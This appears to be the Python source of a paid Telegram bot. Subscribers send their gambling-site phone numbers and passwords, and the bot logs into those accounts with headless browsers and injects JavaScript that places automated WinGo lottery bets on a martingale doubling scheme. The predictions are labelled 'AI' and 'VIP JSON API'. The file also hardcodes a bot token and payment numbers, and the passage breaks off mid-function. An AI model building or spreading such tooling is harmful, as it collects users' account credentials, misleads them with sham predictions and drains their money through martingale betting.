import os
import sys
import subprocess
import time
import threading
import shutil
import json
import uuid

# =====================================================================
# 1. Automatic Package Installer & Imports
# =====================================================================
def install_and_import(package_name, import_name=None):
    if import_name is None:
        import_name = package_name
    try:
        __import__(import_name)
    except ImportError:
        print(f"[*] Installing package: {package_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

install_and_import("pyTelegramBotAPI", "telebot")
install_and_import("selenium")

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService

# =====================================================================
# 2. Mathematical Bold Unicode Converter (Zero Emojis)
# =====================================================================
def to_bold(text: str) -> str:
    res = []
    for c in str(text):
        n = ord(c)
        if 65 <= n <= 90:
            res.append(chr(n + 119743))
        elif 97 <= n <= 122:
            res.append(chr(n + 119737))
        elif 48 <= n <= 57:
            res.append(chr(n + 120764))
        else:
            res.append(c)
    return "".join(res)

# =====================================================================
# 3. Bot Configuration & Credentials
# =====================================================================
TOKEN = "8808949150:AAF236nZ7xG3kPxlxubELHqChpn4IPycFL4"
OWNER_ID = 8707571669

BKASH_NUMBER = "01870829343"
NAGAD_NUMBER = "01876685711"

CHANNEL_1_LINK = "https://t.me/DARK67HACK"
CHANNEL_2_LINK = "https://t.me/bdwin24_bd"

URL_AMARCLUB_LOGIN = "https://amarclub1.com/#/login"
URL_DKWIN_LOGIN = "https://dkwin6.com/#/login"

URL_AMARCLUB_WINGO = "https://amarclub1.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"
URL_DKWIN_WINGO = "https://dkwin6.com/#/saasLottery/WinGo?gameCode=WinGo_30S&lottery=WinGo"

PLANS = {
    "1d": {"days": 1, "price": 500, "label": "1D - 500 BDT"},
    "3d": {"days": 3, "price": 1300, "label": "3D - 1300 BDT"},
    "6d": {"days": 6, "price": 2400, "label": "6D - 2400 BDT"},
    "7d": {"days": 7, "price": 2700, "label": "7D - 2700 BDT"},
    "10d": {"days": 10, "price": 3500, "label": "10D - 3500 BDT"},
    "30d": {"days": 30, "price": 9000, "label": "30D - 9000 BDT"},
}

PROFILES_BASE_DIR = os.path.expanduser("~/.wingo_bot_isolated_profiles")
os.makedirs(PROFILES_BASE_DIR, exist_ok=True)

SUB_DB_FILE = os.path.expanduser("~/.wingo_bot_subscriptions.json")

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

user_sessions = {}
active_sessions = {}
SPINNER_FRAMES = ["-", "\\", "|", "/"]

# =====================================================================
# 4. Subscription & Access Database
# =====================================================================
def load_subscriptions():
    if os.path.exists(SUB_DB_FILE):
        try:
            with open(SUB_DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_subscriptions(data):
    try:
        with open(SUB_DB_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[*] Sub DB write error: {e}")

def is_user_active(chat_id):
    if int(chat_id) == int(OWNER_ID):
        return True
    subs = load_subscriptions()
    user_data = subs.get(str(chat_id))
    if not user_data:
        return False
    expires_at = user_data.get("expires_at", 0)
    return time.time() < expires_at

def activate_user(chat_id, days):
    subs = load_subscriptions()
    now = time.time()
    current_expiry = subs.get(str(chat_id), {}).get("expires_at", now)
    base_time = max(now, current_expiry)
    new_expiry = base_time + (days * 86400)
    subs[str(chat_id)] = {
        "chat_id": chat_id,
        "activated_at": now,
        "expires_at": new_expiry,
        "days": days
    }
    save_subscriptions(subs)
    return new_expiry

def safe_delete_message(chat_id, message_id):
    if not message_id:
        return
    try:
        bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

# =====================================================================
# 5. Browser Automation Engine (100% Session & Profile Isolation)
# =====================================================================
def allocate_session_tab(session_id, target_url):
    sess = active_sessions.get(session_id)
    if not sess:
        raise Exception("Session data not found.")

    profile_dir = os.path.join(PROFILES_BASE_DIR, f"profile_{session_id}_{uuid.uuid4().hex[:6]}")
    os.makedirs(profile_dir, exist_ok=True)
    sess["profile_dir"] = profile_dir

    driver = None
    try:
        options = FirefoxOptions()
        options.add_argument("--headless")
        options.add_argument("-profile")
        options.add_argument(profile_dir)
        options.set_preference("browser.cache.disk.enable", False)
        options.set_preference("browser.cache.memory.enable", True)
        options.set_preference("network.http.use-cache", False)
        service = FirefoxService(log_output=os.devnull)
        driver = webdriver.Firefox(service=service, options=options)
    except Exception as e_ff:
        try:
            chrome_options = ChromeOptions()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument(f"--user-data-dir={profile_dir}")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            driver = webdriver.Chrome(options=chrome_options)
        except Exception as e_cr:
            raise Exception(f"Browser launch failed: FF({e_ff}), Chrome({e_cr})")

    driver.set_window_size(390, 844)
    driver.get(target_url)

    sess["driver"] = driver
    sess["window_handle"] = driver.current_window_handle
    return driver, sess["window_handle"]

def safe_tab_execute(sid, task_fn):
    sess = active_sessions.get(sid)
    if not sess:
        return None
    lock = sess.get("lock")
    driver = sess.get("driver")
    if not driver or not lock:
        return None

    with lock:
        try:
            return task_fn(driver)
        except Exception as e:
            print(f"[*] Tab execute error for {sid}: {e}")
            return None

def close_session_tab(session_id):
    sess = active_sessions.pop(session_id, None)
    if sess:
        sess["is_trading"] = False
        driver = sess.get("driver")
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
        profile_dir = sess.get("profile_dir")
        if profile_dir and os.path.exists(profile_dir):
            try:
                shutil.rmtree(profile_dir, ignore_errors=True)
            except Exception:
                pass

# =====================================================================
# 6. Telegram Image Replacement Engine
# =====================================================================
def display_or_replace_photo(chat_id, session_id, image_path, caption_text, reply_markup=None):
    sess = active_sessions.get(session_id, {})
    last_photo_msg_id = sess.get("live_photo_message_id")
    replaced = False

    if last_photo_msg_id and os.path.exists(image_path):
        try:
            with open(image_path, "rb") as ph:
                media = InputMediaPhoto(ph, caption=caption_text, parse_mode="HTML")
                bot.edit_message_media(
                    media=media,
                    chat_id=chat_id,
                    message_id=last_photo_msg_id,
                    reply_markup=reply_markup
                )
            replaced = True
        except Exception:
            replaced = False

    if not replaced and os.path.exists(image_path):
        try:
            with open(image_path, "rb") as ph:
                msg = bot.send_photo(
                    chat_id, ph,
                    caption=caption_text,
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
                sess["live_photo_message_id"] = msg.message_id
        except Exception as e:
            print(f"[*] Photo replace error: {e}")

# =====================================================================
# 7. In-Browser JavaScript Automation Scripts
# =====================================================================
AUTO_FILL_AND_CLICK_JS = """
const phone = arguments[0];
const pass = arguments[1];

if (!window.location.hash.includes('login')) {
  window.location.hash = '#/login';
}

const initDialogConfirm = document.querySelector('.van-dialog__confirm, .dialog-confirm, button[class*="confirm"], .van-button--primary');
if (initDialogConfirm) {
    try { initDialogConfirm.click(); } catch(e){}
}

let elN = document.querySelector('input[type="tel"], input[placeholder*="phone" i], input[placeholder*="Phone" i]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div > div:nth-of-type(2) > input');

let elP = document.querySelector('input[type="password"]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(2) > div:nth-of-type(2) > input');

let elL = document.querySelector('button[type="submit"]') || 
          document.querySelector('body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(4) > button');

if (!elN || !elP || !elL) {
  return "NOT_READY";
}

const clearAndSetVal = (el, val) => {
  el.focus();
  el.value = '';
  const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;
  if (setter) {
    setter.call(el, val);
  } else {
    el.value = val;
  }
  el.dispatchEvent(new Event('input', { bubbles: true }));
  el.dispatchEvent(new Event('change', { bubbles: true }));
};

clearAndSetVal(elN, phone);

setTimeout(() => {
  clearAndSetVal(elP, pass);
  setTimeout(() => {
    elL.click();
  }, 700);
}, 700);

return "SUCCESS";
"""

CHECK_LOGIN_STATUS_JS = """
const hash = window.location.hash || '';
const href = window.location.href || '';
const bodyText = document.body ? document.body.innerText : '';

const dialog = document.querySelector('.van-dialog');
if (dialog) {
    const dText = dialog.innerText || '';
    if (dText.includes('already logged in') || dText.includes('somewhere else') || 
        dText.includes('logged in') || dText.includes('22') || dText.includes('other device') ||
        dText.includes('Confirm') || dText.includes('Determine') || dText.includes('continue')) {
        const confirmBtn = dialog.querySelector('.van-dialog__confirm, button[class*="confirm"], .van-button--danger, .van-button--primary, button');
        if (confirmBtn) {
            try { confirmBtn.click(); } catch(e){}
            return { status: "CONFIRM_CLICKED", message: "Auto-confirmed already logged in prompt" };
        }
    }
}

const isBonusModal = bodyText.includes('BONUS DAILY RECHARGE') || 
                     bodyText.includes('DAILY RECHARGE') || 
                     bodyText.includes('Daily Bonus') ||
                     bodyText.includes('Deposit Bonus') ||
                     bodyText.includes('Announcement');

if (isBonusModal) {
    const confirmBtn = document.querySelector('.van-dialog__confirm, .dialog-confirm, button[class*="confirm"], button[class*="close"], .van-popup__close-icon');
    if (confirmBtn) {
        try { confirmBtn.click(); } catch(e){}
    }
    return { status: "SUCCESS" };
}

try {
    const t1 = localStorage.getItem('token') || localStorage.getItem('token_str') || localStorage.getItem('auth');
    const t2 = sessionStorage.getItem('token') || sessionStorage.getItem('auth');
    if (t1 || t2) {
        return { status: "SUCCESS" };
    }
} catch(e){}

if (!href.includes('/login') && (!hash.includes('login') || hash.length > 8)) {
    return { status: "SUCCESS" };
}

const toast = document.querySelector('.van-toast--text, .van-toast--fail, .van-toast');
if (toast && toast.innerText && toast.innerText.trim().length > 0) {
    const t = toast.innerText.trim();
    if (t.includes('already logged in') || t.includes('somewhere else') || t.includes('22')) {
        const loginBtn = document.querySelector('button[type="submit"], body > div > div:nth-of-type(2) > div:nth-of-type(4) > div > div > div:nth-of-type(4) > button');
        if (loginBtn) {
            try { loginBtn.click(); } catch(e){}
        }
        return { status: "PENDING", message: "Handling session takeover..." };
    }
    if (t.includes('password') || t.includes('incorrect') || t.includes('wrong') || t.includes('Account does not exist') || t.includes('frozen')) {
        return { status: "ERROR", message: t };
    }
}

return { status: "PENDING" };
"""

WINGO_RUNBOX_AND_CLICK_JS = """
(function(){
    if (!document.getElementById('_run_box')) {
        let d = [{"name": "Wingo", "sel": "body > div > div:nth-of-type(3) > div:nth-of-type(5) > div:nth-of-type(2) > div:nth-of-type(3) > div > div > div > img"}],
            b = document.createElement('div');
        b.id = '_run_box';
        b.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#18181b;padding:6px 10px;border-radius:30px;display:flex;gap:6px;align-items:center;z-index:99999999;box-shadow:0 6px 16px rgba(0,0,0,0.3);font:12px sans-serif;';
        
        let all = document.createElement('button');
        all.innerText = '> All';
        all.style.cssText = 'background:#f59e0b;color:#000;border:none;padding:4px 8px;border-radius:20px;cursor:pointer;font-weight:bold;font-size:11px;';
        all.onclick = () => {
            d.forEach((x, i) => {
                setTimeout(() => {
                    let el = document.querySelector(x.sel);
                    if (el) el.click();
                }, i * 400);
            });
        };
        b.appendChild(all);

        d.forEach(x => {
            let btn = document.createElement('button');
            btn.innerText = x.name;
            btn.style.cssText = 'background:#22c55e;color:#000;border:none;padding:4px 8px;border-radius:20px;cursor:pointer;font-weight:bold;font-size:11px;';
            btn.onclick = () => {
                let el = document.querySelector(x.sel);
                if (el) el.click();
            };
            b.appendChild(btn);
        });

        let x = document.createElement('span');
        x.innerText = 'X';
        x.style.cssText = 'cursor:pointer;color:#a1a1aa;margin-left:4px;font-weight:bold;';
        x.onclick = () => b.remove();
        b.appendChild(x);
        document.body.appendChild(b);
    }

    let target = document.querySelector("body > div > div:nth-of-type(3) > div:nth-of-type(5) > div:nth-of-type(2) > div:nth-of-type(3) > div > div > div > img");
    if (target) {
        target.click();
        return "CLICKED_SELECTOR";
    }
    let alt = document.querySelector("div[class*='wingo' i], img[src*='wingo' i]");
    if (alt) {
        alt.click();
        return "CLICKED_ALT";
    }
    return "INJECTED_WAITING";
})();
"""

CHECK_WINGO_READY_JS = """
const hash = window.location.hash || '';
const href = window.location.href || '';
const bodyText = document.body ? document.body.innerText : '';

const dismissBtns = document.querySelectorAll('.van-dialog__confirm, .dialog-close, .van-popup__close-icon, button[class*="close"], .van-dialog button');
dismissBtns.forEach(btn => { try { btn.click(); } catch(e){} });

if (hash.includes('WinGo') || href.includes('WinGo') || bodyText.includes('Win Go') || bodyText.includes('30S') || bodyText.includes('Time remaining')) {
    return true;
}
return false;
"""

FETCH_BALANCE_JS = """
let els = document.querySelectorAll('*');
for (let i = 0; i < els.length; i++) {
    let txt = els[i].innerText || '';
    if (txt.includes('Wallet balance') || txt.includes('Balance')) {
        let parentTxt = (els[i].parentNode && els[i].parentNode.innerText) ? els[i].parentNode.innerText : '';
        let match = parentTxt.match(/[BDT৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
        if (match) return parseFloat(match[1].replace(/,/g, ''));
    }
}
for (let i = 0; i < els.length; i++) {
    let txt = els[i].innerText || '';
    if (txt.trim().match(/^[BDT৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)) {
        return parseFloat(txt.replace(/[^\\d.]/g, ''));
    }
}
return 0;
"""

WINGO_CORE_JS = """
const autoTargetProfit = arguments[0];
const autoTotalSteps = arguments[1];

(function(){
    if(document.getElementById('sys-core-fin')) {
        let tIn = document.querySelector('#sys-core-fin input[placeholder*="TARGET"]');
        let sIn = document.querySelector('#sys-core-fin input[placeholder*="STEPS"]');
        let btn = document.querySelector('#sys-core-fin button');
        if (tIn && sIn && btn) {
            tIn.value = autoTargetProfit;
            sIn.value = autoTotalSteps;
            btn.click();
        }
        return "ALREADY_EXISTS_RESTARTED";
    }

    const uF=s=>String(s).toUpperCase().split('').map(c=>{
        let n=c.charCodeAt(0);
        if(n>=65&&n<=90)return String.fromCodePoint(n+119743);
        if(n>=48&&n<=57)return String.fromCodePoint(n+120764);
        return c;
    }).join('');

    const cfg={fRt:300,syncDly:2500,minSf:10};
    let st={
        isRun:false,
        startBal:0,
        tgtAmt:0,
        curBal:0,
        autoInt:null,
        preScn:null,
        isTrd:false,
        stpIdx:0,
        dynSeq:[],
        totalSteps:autoTotalSteps || 7,
        tradesDone:0,
        lastPred:null,
        lastPeriod:null,
        balanceCheckInterval:null,
        manualOverrideBet:null,
        w:0,
        l:0,
        cur_w_streak:0,
        cur_l_streak:0,
        max_w_streak:0,
        max_l_streak:0
    };

    window.__WINGO_ST = st;

    let curApiIdx=0,isFetchingApi=false;
    const VoiceEngine={
        speak(msg,lang='en-US',rate=1.1){
            if(!('speechSynthesis' in window))return;
            try{
                window.speechSynthesis.cancel();
                let utter=new SpeechSynthesisUtterance(msg);
                utter.lang=lang;
                utter.rate=rate;
                utter.pitch=1.2;
                utter.volume=1;
                window.speechSynthesis.speak(utter);
            }catch(e){}
        }
    };

    let dTimeLeft=30;
    setInterval(()=>{
        let uClk=document.getElementById('ui-clk');
        if(uClk){
            let minutes=Math.floor(dTimeLeft/60),seconds=dTimeLeft%60;
            uClk.textContent=uF(String(minutes).padStart(2,'0') + ':' + String(seconds).padStart(2,'0'));
        }
        dTimeLeft--;
        if(dTimeLeft<0)dTimeLeft=30;
    },1000);

    let lkOvl=document.createElement('div');
    lkOvl.id='drx-lck-bg';
    lkOvl.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.01);z-index:9999997;display:none;';
    lkOvl.addEventListener('click',e=>{e.preventDefault();e.stopPropagation();},true);
    document.body.appendChild(lkOvl);

    function chkBal(){
        let els=document.querySelectorAll('*');
        for(let i=0;i<els.length;i++){
            let txt=els[i].innerText||'';
            if(txt.includes('Wallet balance')||txt.includes('Balance')){
                let parentTxt=(els[i].parentNode&&els[i].parentNode.innerText)?els[i].parentNode.innerText:'';
                let match=parentTxt.match(/[BDT৳₹$€£]\\s*([\\d,]+\\.?\\d*)/);
                if(match){
                    st.curBal=parseFloat(match[1].replace(/,/g,''));
                    return st.curBal;
                }
            }
        }
        for(let i=0;i<els.length;i++){
            let txt=els[i].innerText||'';
            if(txt.trim().match(/^[BDT৳₹$€£]\\s*[\\d,]+\\.?\\d*$/)){
                st.curBal=parseFloat(txt.replace(/[^\\d.]/g,''));
                return st.curBal;
            }
        }
        return st.curBal;
    }

    function generateSmartSequence(balance,steps){
        steps=Math.max(1,parseInt(steps)||1);
        let b=Math.max(1,Math.floor(balance)||1);
        let units=Math.pow(2,steps)-1;
        if(units>0&&units<=b){
            let base=Math.floor(b/units);
            let seq=[],val=Math.max(1,base);
            for(let i=0;i<steps;i++){
                seq.push(val);
                val*=2;
            }
            return seq;
        }
        let seq=[],val=1,sum=0;
        for(let i=0;i<steps;i++){
            if(sum+val<=b){
                seq.push(val);
                sum+=val;
                val*=2;
            }else{
                let rem=b-sum;
                if(rem>0)seq.push(rem);
                break;
            }
        }
        return seq.length>0?seq:[1];
    }

    let p=document.createElement('div');
    p.id='sys-core-fin';
    p.style.cssText='position:fixed;width:170px;padding:4px;font-family:monospace;font-size:10px;z-index:9999999;color:#fff;user-select:none;border-radius:14px;overflow:visible;background:transparent;';
    let sL=localStorage.getItem('drx_ui_x'),sT=localStorage.getItem('drx_ui_y');
    if(sL&&sT){p.style.left=sL;p.style.top=sT;}else{p.style.top='20px';p.style.right='20px';}

    let stl=document.createElement('style');
    stl.innerHTML='@keyframes titlePulseAnim{0%{transform:scale(1);text-shadow:0 0 10px #00ff00;}50%{transform:scale(1.05);text-shadow:0 0 20px #00ff00,0 0 30px #fff;}100%{transform:scale(1);text-shadow:0 0 10px #00ff00;}}.drx-in{background:rgba(10,12,18,0.92);backdrop-filter:blur(6px);position:relative;overflow:visible;z-index:1;display:flex;flex-direction:column;height:100%;border-radius:12px;border:2px solid #00ff00;box-sizing:border-box;}input::-webkit-outer-spin-button,input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0;}.txt-blk{color:#fff;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-accent{color:#00ff00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-warn{color:#ffcc00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-err{color:#f00;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-cyan{color:#0ff;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.txt-blk-mag{color:#f0f;text-shadow:1px 1px 0 #000,-1px -1px 0 #000,1px -1px 0 #000,-1px 1px 0 #000,0px 4px 5px #000;font-weight:900;letter-spacing:1px;}.drx-elec-target{border-radius:8px!important;position:relative;z-index:9999!important;transition:all 0.1s;background:rgba(0,0,0,0.5)!important;border:2px solid #00ff00!important;}.drx-title-anim{display:inline-block;animation:titlePulseAnim 2s infinite ease-in-out;}';
    document.body.appendChild(stl);
    p.className='drx-wrap';

    let inC=document.createElement('div');
    inC.className='drx-in';
    let h=document.createElement('div');
    h.style.cssText='padding:8px;font-size:12px;display:flex;justify-content:space-between;cursor:move;border-bottom:2px solid #000;background:transparent;';
    h.innerHTML='<span class="txt-blk drx-title-anim" id="drx-title">' + uF('WINZY-MARTINGALE') + '</span><span style="cursor:pointer;" class="txt-blk-err" id="sys-cls">X</span>';
    inC.appendChild(h);

    let drg=false,sx,sy,sl,st_y;
    function dSt(e){
        if(e.target.tagName==='SPAN'&&e.target.id==='sys-cls')return;
        drg=true;
        let ev=e.type.includes('touch')?e.touches[0]:e;
        sx=ev.clientX;sy=ev.clientY;
        sl=p.offsetLeft;st_y=p.offsetTop;
    }
    function dMv(e){
        if(!drg)return;
        e.preventDefault();
        let ev=e.type.includes('touch')?e.touches[0]:e;
        p.style.left=(sl+ev.clientX-sx)+'px';
        p.style.top=(st_y+ev.clientY-sy)+'px';
    }
    function dEn(){
        drg=false;
        localStorage.setItem('drx_ui_x',p.style.left);
        localStorage.setItem('drx_ui_y',p.style.top);
    }
    h.addEventListener('mousedown',dSt);
    document.addEventListener('mousemove',dMv);
    document.addEventListener('mouseup',dEn);

    h.querySelector('#sys-cls').onclick=()=>{
        clearInterval(st.autoInt);
        clearInterval(st.preScn);
        if(st.balanceCheckInterval)clearInterval(st.balanceCheckInterval);
        p.remove();
        lkOvl.remove();
        document.body.style.overflow='';
    };

    let b=document.createElement('div');
    b.style.cssText='padding:10px;display:flex;flex-direction:column;gap:8px;background:transparent;';

    const p1=document.createElement('div');
    p1.innerHTML='<div style="text-align:center;margin-bottom:8px;padding:6px;background:transparent;border-radius:6px;border:2px solid #000;"><span class="txt-blk" style="font-size:9px;color:#ccc;">' + uF('CURRENT BAL') + '</span><br><span id="pre-bal" class="txt-blk" style="font-size:15px;color:#fff;">--</span></div>';

    const tgtInp=document.createElement('input');
    tgtInp.type='number';
    tgtInp.value=autoTargetProfit || '';
    tgtInp.placeholder='TARGET PROFIT (BDT)';
    tgtInp.className='txt-blk';
    tgtInp.style.cssText='width:100%;box-sizing:border-box;padding:8px;margin-bottom:8px;background:transparent;border:2px solid #000;border-radius:4px;text-align:center;font-size:11px;outline:none;color:#fff;';

    const stepInp=document.createElement('input');
    stepInp.type='number';
    stepInp.value=autoTotalSteps || 7;
    stepInp.placeholder='TOTAL STEPS (e.g. 7)';
    stepInp.className='txt-blk-cyan';
    stepInp.style.cssText='width:100%;box-sizing:border-box;padding:8px;margin-bottom:8px;background:transparent;border:2px solid #000;border-radius:4px;text-align:center;font-size:11px;outline:none;color:#0ff;';

    const goBtn=document.createElement('button');
    goBtn.innerText=uF('START');
    goBtn.className='txt-blk-accent';
    goBtn.style.cssText='width:100%;box-sizing:border-box;padding:8px;background:transparent;border:2px solid #000;border-radius:4px;cursor:pointer;font-size:11px;font-weight:bold;transition:0.2s;';

    p1.appendChild(tgtInp);
    p1.appendChild(stepInp);
    p1.appendChild(goBtn);

    st.preScn=setInterval(()=>{
        if(!st.isRun){
            let bal=chkBal();
            let el=document.getElementById('pre-bal');
            if(el)el.innerText=uF(bal>0?bal.toFixed(2):'--');
        }
    },1000);

    const p2=document.createElement('div');
    p2.style.display='none';

    const balBx=document.createElement('div');
    balBx.style.cssText='padding:6px;text-align:center;background:transparent;border-radius:6px;border:2px solid #000;margin-bottom:6px;';
    balBx.innerHTML='<div class="txt-blk" style="font-size:9px;color:#ccc;">' + uF('LIVE BAL / PROFIT') + '</div><div id="ui-bal" class="txt-blk" style="font-size:16px;color:#fff;">--</div>';

    let aiRow='<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('AI:') + '</span><span id="ui-ai" class="txt-blk-cyan">VIP JSON API</span></div>';
    const infBx=document.createElement('div');
    infBx.style.cssText='padding:6px;font-size:10px;line-height:2;background:transparent;border-radius:6px;border:2px solid #000;position:relative;overflow:hidden;';
    infBx.innerHTML=aiRow+'<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('TGT:') + '</span><span id="ui-tgt" class="txt-blk" style="color:#fff;">0</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('STP:') + '</span><span id="ui-bet" class="txt-blk-warn" style="color:#ffcc00;cursor:pointer;">5</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('CLK:') + '</span><span id="ui-clk" class="txt-blk" style="color:#fff;">00:30</span></div>' + '<div style="display:flex;justify-content:space-between;border-bottom:2px dashed #000;"><span class="txt-blk" style="color:#ccc;">' + uF('STS:') + '</span><span id="ui-sts" class="txt-blk" style="color:#fff;">' + uF('WAIT') + '</span></div>';

    const ghBox=document.createElement('div');
    ghBox.id='gh-box-wrap';
    ghBox.style.cssText='width:100%;height:26px;background:transparent;border:2px solid #000;border-radius:4px;padding:2px 4px;margin-top:4px;box-sizing:border-box;overflow:hidden;display:flex;flex-direction:column;justify-content:center;';
    ghBox.innerHTML='<div id="gh-content" class="txt-blk" style="font-size:7.5px;line-height:1.2;color:#fff;white-space:pre-wrap;text-align:left;width:100%;">Syncing API...</div>';
    infBx.appendChild(ghBox);

    const stpBtn=document.createElement('button');
    stpBtn.innerText=uF('STOP');
    stpBtn.className='txt-blk-err';
    stpBtn.style.cssText='width:100%;padding:8px;background:transparent;border:2px solid #000;border-radius:4px;cursor:pointer;font-size:11px;margin-top:6px;transition:0.2s;';

    p2.appendChild(balBx);
    p2.appendChild(infBx);
    p2.appendChild(stpBtn);

    b.appendChild(p1);
    b.appendChild(p2);
    inC.appendChild(b);
    p.appendChild(inC);
    document.body.appendChild(p);

    const drx_triggerEvent=(el,etype)=>{
        let ev=new Event(etype,{bubbles:true,cancelable:true});
        el.dispatchEvent(ev);
    };

    const drx_simClick=el=>{
        if(!el)return;
        ['pointerdown','mousedown','touchstart','pointerup','mouseup','touchend','click'].forEach(evt=>{
            try{
                el.dispatchEvent(new MouseEvent(evt,{bubbles:true,cancelable:true,view:window}));
            }catch(e){}
        });
    };

    const exeTrd=(pred,amt,cb)=>{
        try{
            let btn=null,targetText=pred.toLowerCase(),btns=document.querySelectorAll('button, div, span');
            for(let i=0;i<btns.length;i++){
                let t=(btns[i].innerText||'').trim().toLowerCase();
                if(t===targetText&&btns[i].offsetParent&&!btns[i].children.length){
                    btn=btns[i];
                    break;
                }
            }
            if(!btn){
                if(targetText==='big')btn=document.querySelector('.Betting__C-foot-b');
                else if(targetText==='small')btn=document.querySelector('.Betting__C-foot-s');
                else if(targetText==='green')btn=document.querySelector('button[class*="green"], div[class*="green"]');
                else if(targetText==='red')btn=document.querySelector('button[class*="red"], div[class*="red"]');
                else if(targetText==='violet')btn=document.querySelector('button[class*="violet"], div[class*="violet"]');
            }
            if(!btn){
                if(cb)cb(false);
                return;
            }
            btn.classList.add('drx-elec-target');
            drx_simClick(btn);

            let checkAttempts=0,valInterval=setInterval(()=>{
                checkAttempts++;
                let inpEl=document.querySelector("input[type='number'], input.van-field__control");
                if(inpEl||checkAttempts>15){
                    clearInterval(valInterval);
                    if(inpEl){
                        inpEl.focus();
                        let setV=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,"value").set;
                        if(setV)setV.call(inpEl,String(amt));
                        else inpEl.value=amt;
                        drx_triggerEvent(inpEl,'input');
                        drx_triggerEvent(inpEl,'change');
                        drx_triggerEvent(inpEl,'blur');
                    }
                    setTimeout(()=>{
                        let dEl=document.querySelector('button.bet-amount, button[class*="bet-amount"]');
                        if(dEl){
                            drx_simClick(dEl);
                        }else{
                            document.querySelectorAll('button').forEach(b=>{
                                if((b.innerText||'').includes('Total amount')&&b.offsetParent)drx_simClick(b);
                            });
                        }
                        btn.classList.remove('drx-elec-target');
                        setTimeout(()=>{if(cb)cb(true);},2000);
                    },800);
                }
            },200);
        }catch(e){
            if(cb)cb(false);
        }
    };

    const scnUI=cb=>{
        let ov=document.createElement('div');
        ov.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:transparent;z-index:9999998;pointer-events:none;overflow:hidden;';
        let cBase='#00ff00',rL=document.createElement('div');
        rL.style.cssText='position:absolute;width:100%;height:2px;background:' + cBase + ';box-shadow:0 0 10px 3px ' + cBase + ';animation:sR 0.6s linear infinite alternate;';
        let gL=document.createElement('div');
        gL.style.cssText='position:absolute;height:100%;width:3px;background:' + cBase + ';box-shadow:0 0 15px 5px ' + cBase + ';animation:sG 0.6s cubic-bezier(0.25,0.1,0.25,1) infinite alternate;';
        let sS=document.createElement('style');
        sS.innerHTML='@keyframes sR{0%{top:-10px;}100%{top:100vh;}}@keyframes sG{0%{left:-10px;}100%{left:100vw;}}';
        document.head.appendChild(sS);
        ov.appendChild(rL);
        ov.appendChild(gL);
        document.body.appendChild(ov);
        setTimeout(()=>{
            ov.remove();
            sS.remove();
            if(cb)cb();
        },1500);
    };

    const getNextLivePeriod=str=>{
        let chars=str.split('');
        for(let i=chars.length-1;i>=0;i--){
            if(chars[i]!=='9'){
                chars[i]=String.fromCharCode(chars[i].charCodeAt(0)+1);
                return chars.join('');
            }
            chars[i]='0';
        }
        return '1'+chars.join('');
    };

    const apiLoopTask=async()=>{
        if(!st.isRun||st.isTrd||isFetchingApi)return;
        isFetchingApi=true;
        try{
            chkBal();
            const uBal=document.getElementById('ui-bal'),uSts=document.getElementById('ui-sts'),uBet=document.getElementById('ui-bet');
            if(st.curBal>=st.tgtAmt&&st.curBal>0){
                uBal.innerText=uF(st.curBal.toFixed(2) + ' (DONE)');
                uSts.innerText=uF('DONE');
                uSts.className='txt-blk-accent';
                stpBtn.style.display='none';
                VoiceEngine.speak("Target reached successfully.");
                st.isRun=false;
                clearInterval(st.autoInt);
                lkOvl.style.display='none';
                document.body.style.overflow='';
                return;
            }else{
                uBal.innerText=uF(st.curBal>0?st.curBal.toFixed(2):'--');
            }

